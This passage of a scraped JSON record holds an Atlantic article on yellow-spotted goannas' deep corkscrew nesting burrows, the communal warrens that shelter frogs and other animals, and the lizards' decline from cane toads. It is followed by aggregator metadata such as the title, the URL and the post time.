elaborate structure. A few animals also dig (or dug) helical burrows, including scorpions, pocket gophers, an extinct beaver called  Palaeocastor, and a mammal-like reptile called  Diictodon that lived 255 million years ago. But the yellow-spotted goanna\u2019s nests are deeper than those of all these creatures\u2014extending as far as 13 feet below the surface. \u201cThat\u2019s a ridiculous depth,\u201d Doody told me. He thinks that the yellow-spotted goanna faces a unique challenge. Its large eggs need to incubate for 8 months before hatching\u2014a period that takes them through Australia\u2019s brutal dry season, when several months might go by without any rain. At shallow depths, the eggs would cook and desiccate. Only in deeper soil, which is cooler and wetter, can they survive.\n  To create her elaborate burrow, an expectant female goanna first digs out about two feet of soil and piles it in a nearby mound. Then she effectively swims downward, digging with her front legs while moving the loose sand behind her to backfill the tunnel she creates. This takes days, during which she is encased in soil and surrounded by just enough air to breathe. \u201cWe found one in the act, and she was lodged in there like a potato,\u201d Doody told me. This might be why she moves in a corkscrew, he added: \u201cAny sand that falls back down gets blocked by her body and the fact that she\u2019s turning.\u201d Once she reaches the right depth, she digs an open chamber the size of two clenched fists. She lays her eggs and digs her way back out, emerging seven to 10 days after she first submerged.\n  Several months later, when the baby goannas hatch, they ignore their mother\u2019s helical burrow. Instead, they punch their own way out, scratching straight upward. \u201cSea turtles have to dig through nice, loose sand, and there\u2019s 100 of them,\u201d Doody said. \u201cHere we have maybe eight hatchling lizards going through meters of resistant soil.\u201d\n The goanna burrows are not sparsely distributed. Many of these lizards nest together, creating large communal warrens.  The team once found more than 100 separate clutches in an area the size of a small living room. The researchers\u2019 reconstruction of the site looks like a spring mattress full of tightly packed coils. The goannas reuse these sites year after year, and as the separate burrows merge, collapse, and erode, the warrens become complex labyrinths full of open spaces.\n These vacancies don\u2019t stay empty for long. Doody\u2019s team has found a diverse menagerie of animals sheltering and nesting within the goanna burrows. These include other lizards, snakes, scorpions, centipedes, beetles, ants, and a mouselike marsupial called the fat-tailed false antechinus. Many frogs endure the dry season by burying themselves in the backfilled burrows\u2019 loose soil. \u201cWhen we pulled out backfill, we\u2019d pull out handfuls of frogs, over and over,\u201d Doody told me. In one warren, he and his colleagues found 418 frogs. \u201cThe sheer number and variety of other animals relying on these burrows is astounding,\u201d Jane Melville, a curator at Museums Victoria who studies reptiles and amphibians, told me.\n  Goannas are typically characterized as top predators that will eat anything and everything they can manage. But Doody\u2019s work shows that they create as well as destroy. They easily count as ecosystem engineers\u2014animals that modify their environment in ways that create opportunities for the creatures around them. Beavers (which dam rivers), corals (which create reefs), and woodpeckers (which drill holes in trees) are all ecosystem engineers. But  other than a few species of tortoise and turtle, reptiles are rarely considered among their ranks. \u201cI think this may be due to their often-negative public perception,\u201d Sophie Cross, a herpetologist at Curtin University told me. \u201cReptiles are not considered charismatic. They play important ecological roles, but these aren\u2019t widely known.\u201d\n The yellow-spotted goanna, for example, is found across much of northern Australia, which makes it an engineer with \u201ccontinent-wide importance,\u201d Melville said. Doody thinks that other goanna species also reshape Australia\u2019s landscape, including the country\u2019s largest lizard\u2014the eight-foot-long perentie. His student Kari Soennichsen has been radio-tracking these animals to find out where and how they lay their eggs. \u201cIt\u2019s been miserable trying to find nests for these guys,\u201d Doody said. \u201cThey\u2019re secretive, and you have to be on them all the time.\u201d And last year, as the team was gearing up for another field season, \u201cCOVID really kicked us in the butt.\u201d\n They can\u2019t wait forever.  Cane toads, which were ill-advisedly introduced to Australia in 1935, have been slowly spreading through the country\u2019s northern region, and their poisonous secretions are lethal to would-be predators, including yellow-spotted goannas. In some areas, the lizards\u2019 numbers have fallen by 90 percent. Doody started studying the species to learn the consequences of its disappearance, and his answer is more surprising and more galling than he could have anticipated. As the goannas vanish, so do the underground worlds they create.", "posttime": "2021-06-26 16:36:49", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "giant,\u521b\u9020", "title": "\u6ca1\u6709\u4eba\u60f3\u8c61\u7684\u5de8\u578b\u8725\u8734\u5de2\u4f1a\u662f\u8fd9\u79cd\u5947\u602a\u7684 ", "title_en": "No One Imagined Giant Lizard Nests Would Be This Weird", "transed": 1, "url": "https://www.theatlantic.com/science/archive/2021/06/monitor-lizards-australia-dig-incredible-corkscrew-nests/619294/", "via": "", "real_tags": ["giant", "\u521b\u9020"]}]